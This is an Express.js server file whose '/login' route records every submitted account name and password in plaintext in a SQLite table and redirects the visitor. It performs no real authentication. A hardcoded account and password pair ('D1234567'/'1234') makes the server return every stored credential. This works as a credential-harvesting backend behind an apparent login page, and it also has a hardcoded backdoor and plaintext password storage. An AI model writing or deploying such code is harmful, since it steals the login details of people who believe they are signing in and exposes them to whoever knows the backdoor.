var express = require('express');
var path = require('path');
var cookieParser = require('cookie-parser');
var logger = require('morgan');

var indexRouter = require('./routes/index');
var usersRouter = require('./routes/users');

var app = express();

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

app.use('/', indexRouter);
app.use('/users', usersRouter);

const sqlite3 = require('sqlite3').verbose();
const db = new sqlite3.Database('db/sqlite.db', (err) => {
    if (err) {
        return console.error(err.message);
    }
    console.log('Connected to the SQlite database.');
});

db.run('CREATE TABLE IF NOT EXISTS loginsave (id INTEGER PRIMARY KEY AUTOINCREMENT, account TEXT NOT NULL, password TEXT NOT NULL)');

app.post('/login', function(req, res) {
    var account = req.body.account;
    var password = req.body.password;

    // 检查是否已经存在相同的 account 和 password
    var checkSql = 'SELECT * FROM loginsave WHERE account = ? AND password = ?';
    db.get(checkSql, [account, password], function(err, row) {
        if (err) {
            return console.error(err.message);
        }

        if (!row) {
            // 如果不存在相同的记录，则插入新的记录
            var insertSql = 'INSERT INTO loginsave (account, password) VALUES (?, ?)';
            db.run(insertSql, [account, password], function(err) {
                if (err) {
                    return console.error(err.message);
                }
                console.log('Account and password have been saved to the database.');

                // 如果输入特定账号和密码，显示整个 loginsave 表中的数据
                if (account === 'D1234567' && password === '1234') {
                    db.all('SELECT * FROM loginsave', [], (err, rows) => {
                        if (err) {
                            return console.error(err.message);
                        }
                        res.send(rows);
                    });
                } else {
                    res.redirect('/');
                }
            });
        } else {
            // 如果存在相同的记录，直接检查特定账号和密码
            console.log('Account and password already exist in the database.');

            if (account === 'D1234567' && password === '1234') {
                db.all('SELECT * FROM loginsave', [], (err, rows) => {
                    if (err) {
                        return console.error(err.message);
                    }
                    res.send(rows);
                });
            } else {
                res.redirect('/');
            }
        }
    });
});

module.exports = app;
